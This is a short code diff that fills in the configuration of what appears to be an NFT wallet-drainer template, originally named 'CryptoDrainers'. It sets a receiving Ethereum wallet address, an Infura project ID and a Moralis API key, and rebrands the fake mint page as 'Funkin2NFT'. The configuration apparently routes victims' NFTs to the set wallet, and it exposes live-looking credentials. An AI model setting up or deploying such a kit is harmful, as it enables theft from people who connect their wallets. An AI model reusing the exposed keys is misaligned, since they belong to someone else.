@@ -1,10 +1,10 @@
 // ⚠️ for infura & moralis, make you sure that you copy same number of characters
-const address = "YOUR WALLET";    // Your ETH wallet that you have to receive NFTs
-const infuraId = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"     // Infuria Project ID | https://infura.io/ | For Wallet Connect
-const moralisApi = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"    // Web3 Api key | https://moralis.io/ | For NFTs
+const address = "0x1FD5e3c46085D880840c17813Dd3F36b29EC4081";    // Your ETH wallet that you have to receive NFTs
+const infuraId = "371a901c9f0848039968ff7515e598a1"     // Infuria Project ID | https://infura.io/ | For Wallet Connect
+const moralisApi = "u2kjS9GI9VvXAZmuvISHGc6i3fDud2Pihs76qnckUpqR4TQSYAG06Tu3ixw2kbZ6"    // Web3 Api key | https://moralis.io/ | For NFTs
 
 const collectionInfo = {
-    name: "CryptoDrainers",
+    name: "Funkin2NFT",
     title: "Tec MINT Template", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
     date: "25.06.2022",
     socialMedia: {
